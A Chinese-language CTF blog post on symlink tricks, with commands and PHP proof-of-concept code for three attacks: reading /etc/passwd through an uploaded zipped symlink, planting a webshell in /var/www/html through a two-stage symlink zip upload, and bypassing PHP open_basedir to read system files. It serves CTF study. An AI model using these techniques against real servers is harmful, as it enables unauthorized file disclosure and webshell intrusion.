---
title: 软连接在CTF的应用
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 35
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 通用
categories:
  - 通用
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter



---

<!--more-->

# 文件读取

压缩一个软链接，注意这里是压缩了一个指向`文件`的软链，类似于windows下的快捷方式

- 创建软链
- 把软链打一个zip，上传

```bash
ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```






# 目录穿越文件上传

这里需要上传两次

`第一次`

文件软链接到/文件，压缩上传

```
ln -s /var/www/html    #软链接到/var/www/html
zip -y 1.zip html  #将html压缩为1.zip
```

`第二次`

然后创建一个和刚刚的软链同名(刚刚是html)的文件夹里面塞进shell，把这个文件夹连带里面的webshell打包成zip再次上传

![image-20230603193539606](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306031935433.webp)

上传后shell自动跑到/var/www/html目录



# 绕open_basedir

> symlink(string `$target`, string `$link`): bool
>
> **symlink()** 对于已有的 `target` 建立一个名为 `link` 的符号连接。
>
> - `target`
>
>   连接的目标。
>
> - `link`
>
>   连接的名称。

创建一个链接文件 aaa 用相对路径指向 A/B/C/D，再创建一个链接文件 abc 指向 aaa/../../../../etc/passwd，其实就是指向了 A/B/C/D/../../../../etc/passwd，也就是/etc/passwd。这时候删除 aaa 文件再创建 aaa ==文件夹==，但是 abc 还是指向了 aaa 也就是 aaa/../../../../etc/passwd，就进入了路径/etc/passwd

poc

```php
 <?php
highlight_file ( __FILE__ );
mkdir ( "A" ); //创建目录
chdir ( "A" ); //切换目录
mkdir ( "B" );
chdir ( "B" );
mkdir ( "C" );
chdir ( "C" );
mkdir ( "D" );
chdir ( "D" );
chdir ( ".." );
chdir ( ".." );
chdir ( ".." );
chdir ( ".." );
symlink ( "A/B/C/D" , "aaa" );
symlink ( "aaa/../../../../etc/passwd" , "abc" );
unlink ( "aaa" );
mkdir ( "aaa" );
?> 

```

还有一种姿势，原理类似

```php
mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
symlink('/var/www/html/a/b/c/d/e/f/g','foo');
ini_set('open_basedir','/var/www/html:bar/');
symlink('foo/../../../../../../','bar');
unlink('foo');
symlink('/var/www/html','foo');
echo file_get_contents('bar/etc/passwd');

```





